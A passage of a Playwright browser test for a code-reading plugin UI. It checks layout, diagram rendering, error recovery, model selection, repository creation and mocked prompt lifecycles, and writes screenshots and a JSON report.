  await selectLesson(previousLesson.title); await page.getByRole('heading', { name: previousLesson.title, exact: true }).waitFor(); await page.getByRole('button', { name: '标记已理解', exact: true }).waitFor(); assert.equal(await page.locator('main .cr-lesson').count(), 1); await selectLesson(lesson.title);
  const desktopViewports = [{ width: 1280, height: 900 }, { width: 1440, height: 1000 }, { width: 1920, height: 1080 }];
  for (const viewport of desktopViewports) { await page.setViewportSize(viewport); assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth), true, `${viewport.width}px workbench cannot overflow`); await page.screenshot({ path: path.join(output, `workbench-${viewport.width}.png`), fullPage: true, animations: 'disabled' }); } await page.setViewportSize({ width: 1440, height: 1000 });
  let archiveContentCheck = null;
  if (process.env.DSH_TEST_ARCHIVE_STATE) {
    const archive = JSON.parse(await readFile(process.env.DSH_TEST_ARCHIVE_STATE, 'utf8')); const archived = archive.lessons.at(-1); assert.ok(archived);
    const inlineCount = [...archived.markdown.matchAll(/^```mermaid[^\n]*\n([\s\S]*?)^```/gm)].length; assert.ok(inlineCount > 0);
    const original = { ...lesson }; const caption = `归档内容复验（隔离浏览器）：${archived.title}`;
    Object.assign(lesson, { title: caption, markdown: archived.markdown, conclusion: archived.conclusion, claims: [] }); delete lesson.mermaid;
    await refreshPanel(); await page.getByRole('heading', { name: caption, exact: true }).waitFor();
    assert.equal(await page.locator('iframe[title="Mermaid 调用链图"]').count(), inlineCount); await page.frameLocator('iframe[title="Mermaid 调用链图"]').first().locator('svg').waitFor({ timeout: 30000 });
    await page.screenshot({ path: path.join(output, 'archived-lesson.png'), fullPage: true }); archiveContentCheck = { passed: true, lessonId: archived.id, inlineDiagrams: inlineCount, environment: 'Actual archived Markdown rendered in isolated intercepted Chrome, not the authenticated GUI.' };
    Object.assign(lesson, original); await refreshPanel(); await page.getByRole('heading', { name: original.title, exact: true }).waitFor();
  }
  await page.frameLocator('iframe[title="Mermaid 调用链图"]').locator('svg').waitFor({ timeout: 30000 }); assert.equal(external.length, 0); assert.deepEqual(errors, []);
  await page.screenshot({ path: path.join(output, 'reading-panel.png'), fullPage: true });
  await menu('安装与使用'); await page.getByRole('heading', { name: '安装与使用检查' }).waitFor();
  await page.getByText(`Client ${manifest.version}`, { exact: true }).waitFor(); await page.getByText(`Host ${manifest.version}`, { exact: true }).waitFor();
  await page.screenshot({ path: path.join(output, 'installation-help.png'), fullPage: true }); await closeDialog('安装与使用');
  await page.getByRole('button', { name: '阅读产物', exact: true }).click(); await page.getByRole('dialog', { name: '阅读产物', exact: true }).getByRole('button', { name: '导出档案', exact: true }).click(); await closeDialog('阅读产物'); await page.getByRole('status').filter({ hasText: '阅读档案已导出到' }).waitFor(); assert.equal(requests.filter(row => row.method === 'export').at(-1).params.sessionId, sessionA);
  const remount = async () => page.evaluate(() => { window.readingRoot.unmount(); localStorage.removeItem('dsh-code-reading:active'); window.readingRoot = window.createRoot(document.getElementById('root')); window.renderReadingPanel(); });

  console.log('[browser] Rendering, section/evidence safety and reader-state checks passed; checking unavailable/recovery states.');
  statusMode = 'missing'; await remount(); await page.getByRole('alert').filter({ hasText: 'HOST_UNAVAILABLE' }).waitFor();
  assert.equal(await projectTrigger(page).isDisabled(), true);
  assert.equal(await globalNewReading.isDisabled(), true);
  assert.equal(await page.locator('.cr-welcome').count(), 0);
  assert.equal((await page.locator('.cr-page').innerText()).includes('PRIVATE_SENTINEL'), false);
  await page.screenshot({ path: path.join(output, 'host-unavailable.png'), fullPage: true });
  statusMode = 'healthy'; await page.getByRole('button', { name: '重试连接与加载', exact: true }).click(); await page.locator('.cr-welcome h1').waitFor();

  statusMode = 'old-version'; const beforeMismatch = requests.length; await remount(); await page.getByRole('alert').filter({ hasText: 'VERSION_MISMATCH' }).waitFor();
  assert.equal(requests.slice(beforeMismatch).some(request => ['list', 'models', 'create-project', 'prompt'].includes(request.method)), false);
  assert.equal(await globalNewReading.isDisabled(), true);
  statusMode = 'healthy'; await page.getByRole('button', { name: '重试连接与加载', exact: true }).click(); await page.locator('.cr-welcome h1').waitFor();

  listMode = 'empty'; const hold = deferred(); listHold = hold; listSeen = deferred(); await remount(); await listSeen.promise;
  assert.equal(await page.locator('.cr-welcome').count(), 0);
  assert.equal(await globalNewReading.isDisabled(), true);
  hold.resolve(); await page.locator('.cr-welcome').waitFor(); assert.equal(await globalNewReading.isDisabled(), false); await assertNoStageNavigation();
  listMode = 'failure'; await remount(); await page.getByRole('heading', { name: '阅读项目暂不可用' }).waitFor();
  assert.equal(await page.locator('.cr-welcome').count(), 0);
  listMode = 'healthy'; await page.getByRole('button', { name: '重试连接与加载', exact: true }).click(); await page.locator('.cr-welcome h1').waitFor();

  snapshotFails = true; await openHistory(); await page.locator('.cr-project .cr-session').filter({ hasText: '订单调用链' }).click(); await page.getByRole('heading', { name: '阅读档案加载失败' }).waitFor();
  assert.equal(await page.getByText('正在加载阅读档案…', { exact: true }).count(), 0);
  snapshotFails = false; await page.getByRole('button', { name: '重新加载档案', exact: true }).click(); await page.getByRole('heading', { name: '从下单到支付' }).waitFor();
  await page.getByRole('heading', { name: states.get(sessionA).topic, level: 1, exact: true }).waitFor();
  await showFiles(); await page.locator('.cr-tree-file[title="entry.ts"]').waitFor();
  assert.equal(requests.filter(request => request.method === 'tree').at(-1).params.repoId, repoA, 'retry must initialize the bound repository');
  await openComposer(); await page.getByLabel('追问当前知识点', { exact: true }).fill('尚未提交的追问草稿'); await page.locator('.cr-tree-file[title="entry.ts"]').click(); await source.locator('[data-code-line="41"]').waitFor(); await refreshPanel(); await selectLesson(lesson.title); await openComposer();
  assert.equal(await page.getByLabel('追问当前知识点', { exact: true }).inputValue(), '尚未提交的追问草稿', 'routine snapshot refresh and document switches must not erase an unsent question draft'); await page.getByLabel('追问当前知识点', { exact: true }).fill('');

  paginationMode = true; await remount(); await selectSession('订单调用链'); await openMessages();
  paginationHold = deferred(); paginationSeen = deferred(); const beforeHistory = requests.length; await page.getByRole('button', { name: '加载更早对话', exact: true }).click(); await paginationSeen.promise;
  assert.equal(await page.getByRole('button', { name: '加载更早对话', exact: true }).isDisabled(), true);
  assert.equal(await projectTrigger(page).isDisabled(), true);
  assert.equal(await page.locator('.cr-project .cr-session').filter({ hasText: '支付业务' }).isDisabled(), true);
  await page.getByRole('button', { name: '加载更早对话', exact: true }).dispatchEvent('click'); await page.evaluate(() => new Promise(requestAnimationFrame));
  assert.equal(requests.slice(beforeHistory).filter(request => request.method === 'snapshot' && request.params.beforeSeq !== undefined).length, 1);
  paginationHold.resolve(); await page.getByRole('dialog', { name: '对话记录', exact: true }).locator('summary').filter({ hasText: '阅读导师的解释' }).click(); await page.getByRole('dialog', { name: '对话记录', exact: true }).getByText('HISTORY_ONLY_A', { exact: true }).waitFor(); await closeDialog('对话记录'); await selectSession('支付业务'); await openMessages(); await page.getByRole('dialog', { name: '对话记录', exact: true }).locator('summary').filter({ hasText: 'CURRENT_ONLY_B' }).waitFor();
  assert.equal(await page.getByText('HISTORY_ONLY_A', { exact: true }).count(), 0); await closeDialog('对话记录'); paginationMode = false;

  states.get(sessionB).modelSelection = null; modelsMode = 'empty'; await remount(); await selectSession('支付业务');
  await page.getByText(/暂无可用模型。请先在 DSH/).waitFor(); assert.equal(await page.getByRole('button', { name: '开始阅读', exact: true }).isDisabled(), true);
  await page.getByRole('button', { name: '阅读设置', exact: true }).click(); modelsMode = 'failure'; await page.getByRole('button', { name: '重新加载模型目录', exact: true }).click(); await page.getByRole('dialog', { name: '阅读设置', exact: true }).getByText(/模型目录加载失败/).waitFor();
  const beforeModelRecovery = requests.filter(row => row.method === 'select-model').length;
  modelsMode = 'healthy'; await page.getByRole('button', { name: '重新加载模型目录', exact: true }).click(); await page.waitForFunction(() => document.querySelector('[role="combobox"][aria-label="阅读模型"]')?.disabled === false); await closeDialog('阅读设置');
  assert.equal(await page.locator('.cr-banner').filter({ hasText: '模型目录暂不可用' }).count(), 0, 'model recovery must clear its stale failure notice');
  await modelTrigger(page).getByText('选择模型', { exact: true }).waitFor();
  await modelTrigger(page).click(); await modelPopup(page).getByRole('option', { name: '本地 · Private Reader', exact: true }).waitFor();
  assert.equal(await modelPopup(page).getByRole('option', { selected: true }).count(), 0, 'catalog refresh must not silently choose the global default');
  assert.equal(requests.filter(row => row.method === 'select-model').length, beforeModelRecovery, 'recovery is read-only until an explicit choice');
  await modelPopup(page).getByRole('option', { name: '本地 · Private Reader', exact: true }).click(); await waitForModel(page, '本地', 'Private Reader');
  assert.deepEqual(requests.filter(row => row.method === 'select-model').slice(beforeModelRecovery).map(row => row.params), [{ sessionId: sessionB, provider: 'local', model: 'private-reader' }]);
  await page.locator('#cr-privacy').filter({ hasText: '源码' }).waitFor();

  listMode = 'fresh'; const catalogHold = deferred(); modelsHold = catalogHold; modelsSeen = deferred(); await remount(); await modelsSeen.promise; await globalNewReading.click();
  const creationForm = page.locator('.cr-form'); await page.getByLabel('仓库 1 目录', { exact: true }).waitFor();
  assert.equal(await page.getByLabel('项目名称', { exact: true }).count(), 0, 'repository opening does not ask for a redundant project name');
  assert.equal(await page.getByLabel(/仓库 \d+ 名称/).count(), 0, 'repository identities are derived from paths instead of editable names');
  assert.equal(await creationForm.locator('input:not([type="hidden"])').count(), 1, 'the repository form contains only a path input');
  const repositoryPath = page.getByLabel('仓库 1 目录', { exact: true }); await repositoryPath.fill('D:\\fixtures\\keep-on-cancel');
  await page.getByRole('button', { name: '选择目录', exact: true }).click(); assert.equal(await repositoryPath.inputValue(), 'D:\\fixtures\\keep-on-cancel', 'native picker cancellation preserves the entered path');
  await page.evaluate(() => { window.directoryPickResult = 'D:\\fixtures\\orders'; }); await page.getByRole('button', { name: '选择目录', exact: true }).click();
  await page.waitForFunction(() => document.querySelector('input[aria-label="仓库 1 目录"]')?.value === 'D:\\fixtures\\orders');
  assert.equal(await page.evaluate(() => window.directoryPickCalls), 2); assert.equal(requests.filter(row => row.method === 'create-project').length, 0, 'selecting a directory does not create anything');
  await page.getByRole('button', { name: '打开仓库', exact: true }).click(); await page.getByRole('heading', { name: '选择文件，开始阅读', exact: true }).waitFor(); assert.equal(await page.getByLabel('阅读目标', { exact: true }).isVisible(), false, 'opening a repository must not auto-open a large prompt form');
  const sessionsAtOpen = requests.filter(row => row.method === 'create-session').length; await openHistory(); await page.locator('.cr-project .cr-session').first().click(); await page.getByLabel('阅读目标', { exact: true }).waitFor(); assert.equal(requests.filter(row => row.method === 'create-session').length, sessionsAtOpen, 'opening the existing reading form does not create another session');
  assert.equal(freshProjects.length, 1); assert.equal(freshProjects[0].repositories[0].root, 'D:\\fixtures\\orders'); assert.equal(freshProjects[0].title, 'orders'); assert.equal(freshProjects[0].repositories[0].name, 'orders');
  await page.getByRole('heading', { name: 'orders', level: 1, exact: true }).waitFor();
  const questionMode = page.getByRole('button', { name: '从问题出发', exact: true }); const codeMode = page.getByRole('button', { name: '从代码出发', exact: true });
  assert.equal(await questionMode.getAttribute('aria-pressed'), 'true'); assert.equal(await codeMode.getAttribute('aria-pressed'), 'false');
  await codeMode.click(); assert.equal(await codeMode.getAttribute('aria-pressed'), 'true'); await page.getByRole('button', { name: '选择代码', exact: true }).waitFor();
  await questionMode.click(); assert.equal(await questionMode.getAttribute('aria-pressed'), 'true'); await page.getByLabel('阅读目标', { exact: true }).waitFor(); await assertNoStageNavigation();
  assert.equal(await page.locator('.cr-section-tabs, .cr-route-node').count(), 0, 'new sessions expose neither fake sections nor empty lessons');
  await assertModelDisabled(page, 'a held initial catalog disables the new-session model picker');
  await modelTrigger(page).getByText('正在加载模型…', { exact: true }).waitFor();
  catalogHold.resolve(); await page.waitForFunction(() => document.querySelector('[role="combobox"][aria-label="阅读模型"]')?.disabled === false); await page.getByLabel('阅读目标', { exact: true }).waitFor();
  await modelTrigger(page).getByText('选择模型', { exact: true }).waitFor(); assert.equal(await page.getByRole('button', { name: '开始阅读', exact: true }).isDisabled(), true);
  assert.equal(requests.filter(request => request.method === 'prompt').length, 0, 'creation, mode switches and catalog retrieval must not trigger a model turn');
  await page.screenshot({ path: path.join(output, 'first-reading.png'), fullPage: true });
  const projectCreationsBeforeNewSession = requests.filter(row => row.method === 'create-project').length; const sessionsBeforeNewReading = freshProjects[0].sessions.length;
  const createdReading = page.waitForResponse(response => response.url().endsWith('/api/code-reading') && response.request().postDataJSON()?.method === 'create-session');
  await globalNewReading.click(); await createdReading; await page.waitForFunction(expected => document.querySelectorAll('.cr-project .cr-session').length === expected, sessionsBeforeNewReading + 1); await page.getByLabel('阅读目标', { exact: true }).waitFor(); await page.getByRole('heading', { name: 'orders', level: 1, exact: true }).waitFor();
  assert.equal(freshProjects.length, 1); assert.equal(freshProjects[0].sessions.length, sessionsBeforeNewReading + 1, 'sidebar 新建阅读 creates another session for the active repository'); assert.equal(requests.filter(row => row.method === 'create-project').length, projectCreationsBeforeNewSession, 'new reading in a known repository never duplicates its project');
  assert.equal(await page.locator('.cr-project .cr-session').count(), freshProjects[0].sessions.length, 'session rows remain real sessions after creation'); assert.equal(requests.filter(row => row.method === 'prompt').length, 0);

  sessionCreateFails = true; await menu('打开其他仓库'); await page.getByLabel('仓库 1 目录', { exact: true }).fill('D:\\fixtures\\payments');
  await page.getByRole('button', { name: '打开仓库', exact: true }).click(); await page.getByRole('alert').filter({ hasText: '项目已保存' }).waitFor();
  assert.equal(freshProjects.length, 2); assert.equal(freshProjects[1].sessions.length, 0);
  sessionCreateFails = false; snapshotFails = true; await openHistory(); await page.locator('.cr-project').filter({ has: page.getByRole('heading', { name: freshProjects[1].title, exact: true }) }).getByRole('button', { name: '＋ 新阅读会话', exact: true }).click(); await page.getByRole('heading', { name: '阅读档案加载失败' }).waitFor();
  snapshotFails = false; await page.getByRole('button', { name: '重新加载档案', exact: true }).click(); await page.getByLabel('阅读目标', { exact: true }).waitFor();
  assert.equal(freshProjects.length, 2); assert.equal(freshProjects[1].sessions.length, 1); assert.equal(requests.filter(request => request.method === 'prompt').length, 0);
  await showFiles(); await page.locator('.cr-tree-file[title="entry.ts"]').waitFor();
  assert.equal(requests.filter(request => request.method === 'tree').at(-1).params.repoId, freshProjects[1].repositories[0].id);

  console.log('[browser] Handshake/model recovery and path-only creation passed; checking mock prompt lifecycle.');
  // All prompts below terminate inside this intercepted route; no real model
  // provider or user repository is configured by this test.
  listMode = 'healthy'; await remount(); await selectSession('订单调用链'); promptMode = 'running'; cancelKeepsRunning = true; const pendingAdmission = deferred(); promptHold = pendingAdmission; promptSeen = deferred();
  await sendFixtureQuestion('FIXTURE_PENDING_ADMISSION', true); await promptSeen.promise; await page.locator('.cr-editor-task').filter({ hasText: '等待后端接纳本轮问题' }).waitFor(); await assertModelDisabled(page, 'pending prompt admission disables model changes'); await page.locator('.cr-editor-task').getByRole('button', { name: '停止分析', exact: true }).click(); await page.locator('.cr-editor-task').filter({ hasText: '停止请求已提交，等待后端结束' }).waitFor(); assert.equal(await page.getByLabel('追问当前知识点', { exact: true }).isDisabled(), true, 'a cancel acknowledgement is not a backend turn end');
  const afterCancelPolls = requests.filter(row => row.method === 'snapshot').length; turns.set(sessionA, { ...turnFor(sessionA), running: false, turnEnd: null }); pendingAdmission.resolve(); await page.waitForFunction(() => !document.querySelector('.cr-composer textarea')?.disabled); assert.ok(requests.filter(row => row.method === 'snapshot').length > afterCancelPolls, 'must recheck backend after pending admission settles even without a turn-end event'); cancelKeepsRunning = false;
  promptMode = 'network-error'; await sendFixtureQuestion('FIXTURE_NETWORK_UNCERTAIN'); await page.getByRole('alert').filter({ hasText: 'NETWORK_ERROR' }).waitFor(); const originalAdmission = structuredClone(requests.filter(row => row.method === 'prompt').at(-1).params);
  await selectLesson(previousLesson.title); await page.getByRole('heading', { name: previousLesson.title, exact: true }).waitFor(); promptMode = 'complete'; await page.locator('.cr-retry').click(); await page.getByRole('status').filter({ hasText: '不会重复阅读' }).waitFor(); assert.deepEqual(requests.filter(row => row.method === 'prompt').at(-1).params, originalAdmission, 'uncertain transport retry must freeze request ID, original parent lesson and selection');
  promptMode = 'failure'; await sendFixtureQuestion('FIXTURE_ERROR_KEEP_DRAFT'); await page.getByRole('alert').filter({ hasText: 'FIXTURE_PROMPT_FAILED' }).waitFor(); await page.getByRole('heading', { name: previousLesson.title, exact: true }).waitFor(); assert.equal(await page.getByLabel('追问当前知识点', { exact: true }).inputValue(), 'FIXTURE_ERROR_KEEP_DRAFT');
  await page.evaluate(() => { window.__DSH_TRANSPORT__ = { fetch: (url, options) => fetch(url, { ...options, signal: undefined }) }; }); promptMode = 'running'; await sendFixtureQuestion('LATE_RESPONSE_ONLY_A'); await page.locator('.cr-editor-task').filter({ hasText: '正在分析本轮问题' }).waitFor(); await assertModelDisabled(page, 'a running backend turn disables the model picker'); const late = deferred(); const lateSeen = deferred(); snapshotHolds.set(sessionA, late); snapshotSeen.set(sessionA, lateSeen); await lateSeen.promise; await selectSession('支付业务'); const lateDelivered = page.waitForResponse(response => response.url().endsWith('/api/code-reading') && response.request().postDataJSON()?.method === 'snapshot' && response.request().postDataJSON()?.params.sessionId === sessionA); late.resolve(); await lateDelivered; await page.evaluate(() => new Promise(resolve => requestAnimationFrame(() => requestAnimationFrame(resolve)))); assert.equal(await page.locator('main').getByText(/LATE_RESPONSE_ONLY_A|FIXTURE_ERROR_KEEP_DRAFT/).count(), 0); assert.equal(await page.getByLabel('阅读目标', { exact: true }).inputValue(), states.get(sessionB).topic, 'late A response cannot overwrite B own initial goal'); turns.set(sessionA, { ...turnFor(sessionA), running: false, turnEnd: { seq: ++promptSerial * 10 + 3, reason: { kind: 'cancelled' } } }); promptMode = 'complete'; await page.evaluate(() => { delete window.__DSH_TRANSPORT__; });

  const initialGoal = '支付失败恢复的首次阅读目标'; const beforeInitialPrompt = requests.filter(row => row.method === 'prompt').length; const beforeInitialRevision = states.get(sessionB).revision; await page.getByLabel('阅读目标', { exact: true }).fill(initialGoal); await page.getByRole('button', { name: '开始阅读', exact: true }).click(); const initialConsent = page.getByRole('dialog', { name: '确认源码发送范围', exact: true }); await initialConsent.waitFor(); assert.equal(requests.filter(row => row.method === 'prompt').length, beforeInitialPrompt); await initialConsent.getByRole('button', { name: '确认并开始阅读', exact: true }).click(); await page.getByRole('heading', { name: initialGoal, level: 1, exact: true }).waitFor(); await page.waitForFunction(() => !!document.querySelector('.cr-composer textarea') && !document.querySelector('.cr-composer textarea').disabled); assert.equal(states.get(sessionB).topic, initialGoal); assert.equal(states.get(sessionB).revision, beforeInitialRevision + 1); assert.equal(requests.filter(row => row.method === 'prompt').at(-1).params.expectedRevision, states.get(sessionB).revision, 'explicit first prompt uses the newly admitted goal revision'); assert.equal(requests.filter(row => row.method === 'prompt').at(-1).params.readingMode, 'question'); await assertNoStageNavigation();

  await page.setViewportSize({ width: 480, height: 1000 }); await menu('安装与使用'); await page.getByRole('heading', { name: '安装与使用检查' }).waitFor();
  assert.equal(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth), true, 'onboarding must not overflow the narrow viewport');
  await page.screenshot({ path: path.join(output, 'installation-narrow.png'), fullPage: true });
  await page.evaluate(() => { const palette = { '--dsw-alias-bg-base': '#18181b', '--dsw-alias-bg-layer-1': '#27272a', '--dsw-alias-border-l1': '#52525b', '--dsw-alias-label-primary': '#fafafa', '--dsw-alias-label-secondary': '#d4d4d8', '--dsw-alias-brand-primary': '#5573dc' }; for (const [key, value] of Object.entries(palette)) document.documentElement.style.setProperty(key, value); });
  await page.screenshot({ path: path.join(output, 'installation-dark.png'), fullPage: true });
  await closeDialog('安装与使用');
  await page.waitForFunction(() => document.querySelector('[role="combobox"][aria-label="阅读模型"]')?.disabled === false);
  const bodyBeforeModelPopup = await page.evaluate(() => ({ pointerEvents: document.body.style.pointerEvents, scrollLock: document.body.getAttribute('data-scroll-locked') }));
  await modelTrigger(page).click(); await modelPopup(page).waitFor();
  await page.evaluate(() => { window.readingRoot.unmount(); for (const dispose of window.effectDisposers.splice(0).reverse()) dispose(); });
  await modelPopup(page).waitFor({ state: 'detached' });
  assert.equal(await page.locator('.cr-select-content,[data-radix-popper-content-wrapper]').count(), 0, 'unmounting with an open picker removes the portaled popup and its positioning wrapper');
  await page.waitForFunction(before => document.body.style.pointerEvents === before.pointerEvents && document.body.getAttribute('data-scroll-locked') === before.scrollLock, bodyBeforeModelPopup);
  assert.equal(await page.locator('style[data-plugin="dsh-code-reading"]').count(), 0); assert.equal(await page.evaluate(() => Object.keys(window.slots).length), 0);
  assert.equal(external.length, 0); assert.deepEqual(errors, []);
  console.log('[browser] Component security/state/consent checks passed; running actual Host workspace fixture.');
  const fileWorkspace = await verifyFileWorkspace({ browser, output, plugin, bootstrap: bootstrap.outputFiles[0].text });
  const report = { passed: true, projectSelect, modelSelect: { ...modelSelect, loadingDisabled: true, runningDisabled: true, recoveryWithoutDefault: true, portalCleanup: true }, environment: 'Isolated React component in Chrome; HTTP fixtures intercepted. Not the authenticated DSH shell.', checks: ['Native DSH Client factory/external-module contract', 'Sidebar entry and main slot', 'Mermaid sequence diagram rendered as sanitized sandbox SVG', 'Five diagram types retain native SVG labels with syntax-error source fallback', 'Markdown image cannot auto-load', 'Mermaid asset/click/HTML rejected before rendering', 'No unexpected HTTP requests or page errors', 'Restored session model overrides global default across switches', 'File-result repository identity survives selector changes', 'Flat actual-lesson reading list; no five-stage navigation anywhere', 'Dimension switches appear only for actual published sections and never mutate backend stage', 'Question/code reading mode aria-pressed state and explicit prompt contract', 'Path-only repository form and native directory-picker cancellation/success', 'Reading bindings and actual model survive ordinary workspace change and panel remount', 'Host/Client handshake and old-version mutation blocking', '404 HTML recovery without raw response disclosure', 'Deferred/failed list is not a false empty state', 'Snapshot failure terminates loading and supports read-only recovery', 'Missing/failed model catalog and retry without default-provider switching', 'First creation does not call prompt; partial creation remains recoverable', 'Sidebar new reading creates a session in the active repository without duplicating projects', 'Desktop file explorer expands independently and source documents render only in the center', 'Narrow viewport and DSH-token dark-mode screenshots', 'Client disposal removes owned styles and native slot registrations', 'Retry restores topic/repository across projects without erasing draft edits', 'History pagination is single-flight and scoped to the current session', 'Late initial model catalog cannot clear a newly created session', '1280/1440/1920 workbench layout without document overflow', 'Only one selected knowledge point; conclusion and explicit understanding marker', 'Independent reader-state restore and session-scoped source position', 'Actual evidence hash/range highlighting; changed hash and unknown reference rejected', 'Path/content search clears stale repository results and preserves identity', 'Explicit source-range consent before first mock prompt', 'Pending model admission can be stopped before HTTP response', 'Stop waits for backend idle without inventing a turn-end', 'NETWORK_ERROR retry freezes request ID and parent lesson', 'Failed prompt retains previous content and draft', 'Ignored abort cannot let late A snapshot overwrite B', 'Reading artifact export remains available'], pluginVersion: manifest.version, clientSource: process.env.DSH_TEST_CLIENT_BUNDLE ? 'extracted release archive' : 'workspace build', archiveContentCheck, codeReadability, fileWorkspace, fixturePreviews: { viewport: { width: 1220, height: 968 }, environment: 'Intercepted isolated fixture, not the authenticated GUI.', files: ['reading-welcome-1220.png', 'reading-question-1220.png', 'reading-code-1220.png', 'reading-result-1220.png'] }, desktopViewports, mockModelPrompts: requests.filter(row => row.method === 'prompt').length, realModelRequest: false, externalRequests: external, pageErrors: errors };
  await writeFile(path.join(output, 'report.json'), JSON.stringify(report, null, 2)); console.log(JSON.stringify(report, null, 2));
} catch (error) {
  await activePage?.screenshot({ path: path.join(output, 'browser-failure.png'), fullPage: true, animations: 'disabled' }).catch(() => {});
  await writeFile(path.join(output, 'browser-failure.json'), JSON.stringify({ passed: false, message: error.message, stack: error.stack, errors, external, lastRequests: requests.slice(-15), text: await activePage?.locator('body').innerText().catch(() => '') }, null, 2));
  throw error;
} finally { await browser.close(); }
